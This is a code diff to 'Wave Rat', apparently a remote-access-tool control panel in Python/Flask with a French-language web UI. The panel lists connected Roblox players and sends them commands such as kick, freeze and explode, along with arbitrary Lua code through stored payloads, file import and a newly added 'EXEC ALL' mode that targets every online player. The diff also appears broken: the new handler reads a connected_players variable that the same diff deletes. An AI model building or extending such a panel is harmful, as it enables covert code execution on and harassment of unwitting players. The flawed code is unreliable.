@@ -36,7 +36,8 @@ def load_history():
         try:
             with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                 history_log = json.load(f)
-        except: history_log = []
+        except:
+            history_log = []
 
 def load_payloads():
     global payloads
@@ -44,13 +45,15 @@ def load_payloads():
         try:
             with open(PAYLOADS_FILE, 'r', encoding='utf-8') as f:
                 payloads = json.load(f)
-        except: payloads = {}
+        except:
+            payloads = {}
 
 def save_payloads():
     try:
         with open(PAYLOADS_FILE, 'w', encoding='utf-8') as f:
             json.dump(payloads, f, ensure_ascii=False, indent=2)
-    except: pass
+    except:
+        pass
 
 load_history()
 load_payloads()
@@ -125,14 +128,16 @@ def logout():
 def add_history(event_type, username, details=""):
     timestamp = datetime.now().strftime("%H:%M:%S")
     history_log.insert(0, {"time": timestamp, "type": event_type, "username": username, "details": details})
-    if len(history_log) > 100: history_log.pop()
+    if len(history_log) > 100:
+        history_log.pop()
     try:
         with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
             json.dump(history_log, f, ensure_ascii=False, indent=2)
-    except: pass
+    except:
+        pass
     socketio.emit("history_update", {"history": history_log[:50]})
 
-# ==================== PANEL HTML ====================
+# ==================== PANEL HTML (SANS AVATAR, AVEC EXEC MULTI) ====================
 HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
@@ -163,9 +168,7 @@ HTML = """<!DOCTYPE html>
     .card:hover{transform:translateY(-10px);box-shadow:0 25px 50px rgba(6,182,212,.25);border-color:var(--primary);}
     .card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,transparent,var(--primary),transparent);opacity:0;transition:.4s;}
     .card:hover::before{opacity:1;}
-    .player-avatar{position:absolute;top:-20px;right:10px;width:90px;height:90px;border-radius:50%;border:4px solid var(--primary);box-shadow:0 0 25px rgba(6,182,212,.6);z-index:10;background:#0f172a;}
-    .player-avatar img{width:100%;height:100%;border-radius:50%;object-fit:cover;}
-    .status{display:flex;align-items:center;gap:8px;margin-bottom:12px;margin-top:50px;}
+    .status{display:flex;align-items:center;gap:8px;margin-bottom:12px;margin-left:35px;}
     .dot{width:10px;height:10px;border-radius:50%;background:#ef4444;box-shadow:0 0 10px #ef444430;}
     .dot.online{background:var(--primary);box-shadow:0 0 20px var(--primary);animation:pulse 2s infinite;}
     @keyframes pulse{0%,100%{opacity:1}50%{opacity:.7}}
@@ -204,11 +207,10 @@ HTML = """<!DOCTYPE html>
         <svg viewBox="0 0 738 738"><rect fill="#0f172a" width="738" height="738"></rect><path fill="#06b6d4" d="M550.16,367.53q0,7.92-.67,15.66c-5.55-17.39-19.61-44.32-53.48-44.32-50,0-54.19,44.6-54.19,44.6a22,22,0,0,1,18.19-9c12.51,0,19.71,4.92,19.71,18.19S468,415.79,448.27,415.79s-40.93-11.37-40.93-42.44c0-58.71,55.27-68.56,55.27-68.56-44.84-4.05-61.56,4.76-75.08,23.3-25.15,34.5-9.37,77.47-9.37,77.47s-33.87-18.95-33.87-74.24c0-89.28,91.33-100.93,125.58-87.19-23.74-23.75-43.4-29.53-69.11-29.53-62.53,0-108.23,60.13-108.23,111,0,44.31,34.85,117.16,132.31,117.16,86.66,0,95.46-55.09,86-69,36.54,36.57-17.83,84.12-86,84.12-28.87,0-105.17-6.55-150.89-79.59C208,272.93,334.58,202.45,334.58,202.45c-32.92-2.22-54.82,7.85-56.62,8.71a181,181,0,0,1,272.2,156.37Z"></path></svg>
         <div>Wave Rat</div>
     </div>
-    <div style="display:flex;align-items:center;gap:20px;">
-        <div class="stats">Players online: <b id="stats">0</b></div>
-        <a href="/logout"><button class="logout-btn">Déconnexion</button></a>
-    </div>
+    <div class="stats">Players online: <b id="stats">0</b></div>
+    <a href="/logout"><button class="logout-btn">Déconnexion</button></a>
 </div>
+
 <div class="main">
     <div class="sidebar">
         <div class="nav-item active" data-tab="players">Players</div>
@@ -228,12 +230,31 @@ HTML = """<!DOCTYPE html>
     </div>
 </div>
 
-<!-- Modales -->
+<!-- Modals -->
 <div class="modal" id="kickModal"><div class="modal-content"><h2>Kick</h2><input type="text" id="kickReason" placeholder="Raison (optionnel)"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmKick">Kick</button></div></div></div>
 <div class="modal" id="playSoundModal"><div class="modal-content"><h2>Sound</h2><input type="text" id="soundAssetId" placeholder="Asset ID"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmSound">Jouer</button></div></div></div>
 <div class="modal" id="textScreenModal"><div class="modal-content"><h2>Text Screen</h2><input type="text" id="screenText" placeholder="Texte à afficher" value="test"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmText">Afficher</button></div></div></div>
+
+<!-- MODALE LUA EXEC MULTI -->
+<div class="modal" id="luaExecModal"><div class="modal-content">
+    <h2>Exécuter Lua</h2>
+    <div style="margin-bottom:15px;">
+        <label><input type="checkbox" id="selectAllPlayers"> Tous les joueurs</label>
+    </div>
+    <textarea id="luaScript" placeholder="Code Lua..." style="height:200px;"></textarea>
+    <div style="margin-top:10px;color:var(--text-muted);font-size:0.9rem;">
+        <span id="selectedCount">0</span> joueur(s) sélectionné(s)
+    </div>
+    <div class="modal-buttons">
+        <button class="modal-btn cancel">Annuler</button>
+        <button class="modal-btn confirm" id="confirmLua">Exécuter sur sélection</button>
+        <button class="modal-btn confirm" style="background:#dc2626;" id="confirmLuaAll">EXEC ALL</button>
+    </div>
+</div></div>
+
 <div class="modal" id="importFileModal"><div class="modal-content"><h2>Importer Fichier</h2><input type="file" id="luaFileInput" accept=".lua,.txt"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmImport">Exécuter</button></div></div></div>
 
+<!-- Payloads -->
 <div class="modal" id="payloadModal"><div class="modal-content">
     <h2 id="payloadModalTitle">Nouveau Payload</h2>
     <input type="text" id="payloadName" placeholder="Nom du payload">
@@ -248,37 +269,22 @@ HTML = """<!DOCTYPE html>
     <h2>Importer Payload</h2>
     <input type="text" id="payloadSearch" placeholder="Rechercher payload..." onkeyup="filterPayloads()">
     <div class="payload-list" id="payloadList"></div>
-    <textarea id="tempPayloadCode" placeholder="Sélectionne un payload..." style="height:200px;"></textarea>
+    <textarea id="tempPayloadCode" placeholder="Sélectionne un payload pour voir/editer le code..." style="height:200px;"></textarea>
     <div class="modal-buttons">
         <button class="modal-btn cancel">Annuler</button>
         <button class="modal-btn confirm" id="executeTempPayload">Exécuter</button>
     </div>
 </div></div>
 
-<!-- Modal Lua Multi -->
-<div class="modal" id="multiLuaModal">
-    <div class="modal-content">
-        <h2>Exécuter Lua (Multi)</h2>
-        <div style="margin-bottom:1rem;">
-            <label><input type="checkbox" id="selectAllPlayers"> Sélectionner tous</label>
-        </div>
-        <div class="payload-list" id="multiPlayerList" style="max-height:300px;"></div>
-        <textarea id="multiLuaScript" placeholder="Code Lua..." style="height:200px;"></textarea>
-        <div class="modal-buttons">
-            <button class="modal-btn cancel">Annuler</button>
-            <button class="modal-btn confirm" id="executeMultiLua">Exécuter</button>
-        </div>
-    </div>
-</div>
-
 <div class="toast-container" id="toasts"></div>
 
 <script>
 const socket = io();
 let currentPlayerId = null;
+let editingPayloadName = null;
 let selectedPlayers = new Set();
-let connected_players = {};
 
+// Navigation
 document.querySelectorAll('.nav-item').forEach(i => i.addEventListener('click', () => {
     document.querySelectorAll('.nav-item').forEach(x => x.classList.remove('active'));
     document.querySelectorAll('.tab').forEach(x => x.style.display = 'none');
@@ -300,7 +306,61 @@ function filterPlayers() {
     });
 }
 
-// === WORKSHOP ===
+// === GESTION SÉLECTION MULTIPLE ===
+function updateSelectedCount() {
+    document.getElementById('selectedCount').textContent = selectedPlayers.size;
+}
+
+document.addEventListener('change', (e) => {
+    if (e.target.classList.contains('player-select')) {
+        const id = e.target.dataset.id;
+        if (e.target.checked) selectedPlayers.add(id);
+        else selectedPlayers.delete(id);
+        updateSelectedCount();
+    }
+});
+
+document.getElementById('selectAllPlayers').addEventListener('change', (e) => {
+    document.querySelectorAll('.player-select').forEach(cb => {
+        cb.checked = e.target.checked;
+        const id = cb.dataset.id;
+        if (e.target.checked) selectedPlayers.add(id);
+        else selectedPlayers.delete(id);
+    });
+    updateSelectedCount();
+});
+
+function openLuaExecModal() {
+    selectedPlayers.clear();
+    document.querySelectorAll('.player-select').forEach(cb => cb.checked = false);
+    document.getElementById('selectAllPlayers').checked = false;
+    updateSelectedCount();
+    document.getElementById('luaScript').value = '';
+    document.getElementById('luaExecModal').classList.add('active');
+}
+
+document.getElementById('confirmLua').onclick = () => {
+    const script = document.getElementById('luaScript').value.trim();
+    if (!script) return toast('Script vide');
+    if (selectedPlayers.size === 0) return toast('Aucun joueur sélectionné');
+    selectedPlayers.forEach(id => sendTroll(id, 'luaexec', script));
+    toast(`Script envoyé à ${selectedPlayers.size} joueur(s)`);
+    document.getElementById('luaExecModal').classList.remove('active');
+};
+
+document.getElementById('confirmLuaAll').onclick = () => {
+    const script = document.getElementById('luaScript').value.trim();
+    if (!script) return toast('Script vide');
+    Object.keys(connected_players).forEach(id => {
+        if (connected_players[id]?.online) {
+            sendTroll(id, 'luaexec', script);
+        }
+    });
+    toast('Script envoyé à TOUS les joueurs en ligne !');
+    document.getElementById('luaExecModal').classList.remove('active');
+};
+
+// === FONCTIONS PAYLOADS (inchangées) ===
 function loadPayloads() {
     fetch('/payload?action=list').then(r => r.json()).then(data => {
         const list = document.getElementById('payloads-list');
@@ -320,7 +380,6 @@ function loadPayloads() {
     });
 }
 
-let editingPayloadName = null;
 document.getElementById('newPayloadBtn').onclick = () => {
     editingPayloadName = null;
     document.getElementById('payloadModalTitle').textContent = 'Nouveau Payload';
@@ -366,14 +425,13 @@ document.getElementById('savePayload').onclick = () => {
     });
 };
 
-// === PAYLOAD EXEC ===
 function openPayloadSelector(id) {
     currentPlayerId = id;
     fetch("/payload?action=list").then(r => r.json()).then(data => {
         const list = document.getElementById("payloadList");
         list.innerHTML = "";
         if (Object.keys(data).length === 0) {
-            list.innerHTML = "<p style='color:#94a3b8;text-align:center;padding:20px;'>Aucun payload</p>";
+            list.innerHTML = "<p style='color:#94a3b8;text-align:center;padding:20px;'>Aucun payload disponible</p>";
         } else {
             for (const name of Object.keys(data)) {
                 const item = document.createElement("div");
@@ -389,7 +447,7 @@ function openPayloadSelector(id) {
                 list.appendChild(item);
             }
         }
-        document.getElementById("executePayloadModal").classList.add('active');
+        document.getElementById("executePayloadModal").classList.add("active");
     });
 }
 
@@ -402,12 +460,12 @@ function filterPayloads() {
 
 document.getElementById('executeTempPayload').onclick = () => {
     const code = document.getElementById('tempPayloadCode').value.trim();
-    if (!code) return toast('Aucun code');
+    if (!code) return toast('Aucun code à exécuter');
     sendTroll(currentPlayerId, 'luaexec', code);
     document.getElementById('executePayloadModal').classList.remove('active');
 };
 
-// === MODALES ===
+// === MODALS CLASSIQUES ===
 function openKickModal(id) { currentPlayerId = id; document.getElementById('kickModal').classList.add('active'); }
 function openPlaySoundModal(id) { currentPlayerId = id; document.getElementById('playSoundModal').classList.add('active'); }
 function openTextScreenModal(id) { currentPlayerId = id; document.getElementById('textScreenModal').classList.add('active'); }
@@ -453,84 +511,17 @@ document.getElementById('confirmImport').onclick = () => {
     reader.readAsText(file);
 };
 
-// === LUA MULTI ===
-function openMultiLuaModal() {
-    selectedPlayers.clear();
-    document.getElementById('selectAllPlayers').checked = false;
-    document.getElementById('multiLuaScript').value = '';
-
-    const list = document.getElementById('multiPlayerList');
-    list.innerHTML = '';
-
-    const onlinePlayers = Object.entries(connected_players).filter(([_, p]) => p.online);
-    if (onlinePlayers.length === 0) {
-        list.innerHTML = '<p style="color:#94a3b8;text-align:center;padding:20px;">Aucun joueur en ligne</p>';
-    } else {
-        for (const [id, p] of onlinePlayers) {
-            const item = document.createElement('div');
-            item.className = 'payload-item';
-            item.innerHTML = `
-                <label style="display:flex;align-items:center;cursor:pointer;padding:8px;">
-                    <input type="checkbox" value="${id}" style="margin-right:12px;">
-                    <img src="https://www.roblox.com/headshot-thumbnail/image?userId=${id}&width=30&height=30&format=png" style="width:30px;height:30px;border-radius:50%;margin-right:12px;">
-                    ${p.username} (${id})
-                </label>`;
-            item.querySelector('input').addEventListener('change', e => {
-                if (e.target.checked) selectedPlayers.add(id);
-                else selectedPlayers.delete(id);
-            });
-            list.appendChild(item);
-        }
-    }
-    document.getElementById('multiLuaModal').classList.add('active');
-}
-
-document.getElementById('selectAllPlayers').addEventListener('change', e => {
-    document.querySelectorAll('#multiPlayerList input[type="checkbox"]').forEach(cb => {
-        cb.checked = e.target.checked;
-        if (e.target.checked) selectedPlayers.add(cb.value);
-        else selectedPlayers.delete(cb.value);
-    });
-});
-
-document.getElementById('executeMultiLua').onclick = () => {
-    const script = document.getElementById('multiLuaScript').value.trim();
-    if (!script) return toast('Script vide');
-    if (selectedPlayers.size === 0) return toast('Aucun joueur sélectionné');
-
-    let count = 0;
-    for (const uid of selectedPlayers) {
-        sendTroll(uid, 'luaexec', script);
-        count++;
-    }
-    toast(`Exécuté sur ${count} joueur${count > 1 ? 's' : ''}`);
-    document.getElementById('multiLuaModal').classList.remove('active');
-};
-
-// Fermeture au clic extérieur
-document.querySelectorAll('.modal').forEach(m => m.addEventListener('click', e => { if (e.target === m) m.classList.remove('active'); }));
-
-// === RENDER PLAYERS ===
+// === RENDER ===
 function render(data) {
-    connected_players = data.players;
     document.getElementById('stats').innerText = data.online;
     const grid = document.getElementById('players');
     const current = new Set(Object.keys(data.players));
-
     Object.entries(data.players).forEach(([id, p]) => {
         let card = document.getElementById(`card_${id}`);
-        if (!card) {
-            card = document.createElement('div');
-            card.className = 'card';
-            card.id = `card_${id}`;
-            grid.appendChild(card);
-        }
-
-        const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${id}&width=150&height=150&format=png`;
-
+        if (!card) { card = document.createElement('div'); card.className = 'card'; card.id = `card_${id}`; grid.appendChild(card); }
         card.innerHTML = `
-            <div class="player-avatar">
-                <img src="${avatarUrl}" alt="Avatar" onerror="this.src='https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png'">
+            <div style="position:absolute;top:12px;left:12px;z-index:10;">
+                <input type="checkbox" class="player-select" data-id="${id}" style="width:18px;height:18px;cursor:pointer;">
             </div>
             <div class="status"><div class="dot ${p.online?'online':''}"></div><span>${p.online?'Online':'Offline'}</span></div>
             <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (${id})</div>
@@ -542,38 +533,34 @@ function render(data) {
             </div>
             <div class="category">TROLLS</div>
             <div class="btn-grid">
-                <button class="btn kick" onclick="event.stopPropagation(); openKickModal('${id}')">KICK</button>
-                <button class="btn" onclick="event.stopPropagation(); sendTroll('${id}','freeze')">FREEZE</button>
-                <button class="btn" onclick="event.stopPropagation(); sendTroll('${id}','spin')">SPIN</button>
-                <button class="btn" onclick="event.stopPropagation(); sendTroll('${id}','jump')">JUMP</button>
-                <button class="btn" onclick="event.stopPropagation(); sendTroll('${id}','rainbow')">RAINBOW</button>
-                <button class="btn" onclick="event.stopPropagation(); sendTroll('${id}','explode')">EXPLODE</button>
-                <button class="btn" onclick="event.stopPropagation(); sendTroll('${id}','invisible')">INVISIBLE</button>
-                <button class="btn" onclick="event.stopPropagation(); openPlaySoundModal('${id}')">SOUND</button>
-                <button class="btn" onclick="event.stopPropagation(); openTextScreenModal('${id}')">TEXT</button>
+                <button class="btn kick" onclick="openKickModal('${id}')">KICK</button>
+                <button class="btn" onclick="sendTroll('${id}','freeze')">FREEZE</button>
+                <button class="btn" onclick="sendTroll('${id}','spin')">SPIN</button>
+                <button class="btn" onclick="sendTroll('${id}','jump')">JUMP</button>
+                <button class="btn" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
+                <button class="btn" onclick="sendTroll('${id}','explode')">EXPLODE</button>
+                <button class="btn" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
+                <button class="btn" onclick="openPlaySoundModal('${id}')">SOUND</button>
+                <button class="btn" onclick="openTextScreenModal('${id}')">TEXT</button>
             </div>
             <div class="category">UNDO</div>
             <div class="btn-grid">
-                <button class="btn undo" onclick="event.stopPropagation(); sendTroll('${id}','unfreeze')">UNFREEZE</button>
-                <button class="btn undo" onclick="event.stopPropagation(); sendTroll('${id}','unspin')">UNSPIN</button>
-                <button class="btn undo" onclick="event.stopPropagation(); sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
-                <button class="btn undo" onclick="event.stopPropagation(); sendTroll('${id}','uninvisible')">VISIBLE</button>
-                <button class="btn undo" onclick="event.stopPropagation(); sendTroll('${id}','stopsound')">STOP SOUND</button>
-                <button class="btn undo" onclick="event.stopPropagation(); sendTroll('${id}','hidetext')">HIDE TEXT</button>
+                <button class="btn undo" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
+                <button class="btn undo" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
+                <button class="btn undo" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
+                <button class="btn undo" onclick="sendTroll('${id}','uninvisible')">VISIBLE</button>
+                <button class="btn undo" onclick="sendTroll('${id}','stopsound')">STOP SOUND</button>
+                <button class="btn undo" onclick="sendTroll('${id}','hidetext')">HIDE TEXT</button>
             </div>
             <div class="category">LUA</div>
-            <div class="btn-grid" style="grid-template-columns:1fr 1fr 1fr;">
-                <button class="btn" onclick="event.stopPropagation(); openImportFileModal('${id}')">FILE</button>
-                <button class="btn" onclick="event.stopPropagation(); openPayloadSelector('${id}')">PAYLOAD</button>
-                <button class="btn" onclick="event.stopPropagation(); openMultiLuaModal()">EXEC (Multi)</button>
+            <div class="btn-grid" style="grid-template-columns:1fr 1fr 1fr">
+                <button class="btn" onclick="openImportFileModal('${id}')">FILE</button>
+                <button class="btn" onclick="openLuaExecModal()">EXEC</button>
+                <button class="btn" onclick="openPayloadSelector('${id}')">PAYLOAD</button>
             </div>
         `;
     });
-
-    // Supprime les cartes des joueurs déconnectés
-    document.querySelectorAll('.card').forEach(c => {
-        if (!current.has(c.id.replace('card_', ''))) c.remove();
-    });
+    document.querySelectorAll('.card').forEach(c => { if (!current.has(c.id.replace('card_',''))) c.remove(); });
 }
 
 function renderHistory(d) {
@@ -583,7 +570,6 @@ function renderHistory(d) {
 socket.on('update', render);
 socket.on('history_update', renderHistory);
 socket.on('kick_notice', d => toast(d.username + ' → ' + d.reason));
-
 fetch('/get_history').then(r => r.json()).then(renderHistory);
 </script>
 </body>
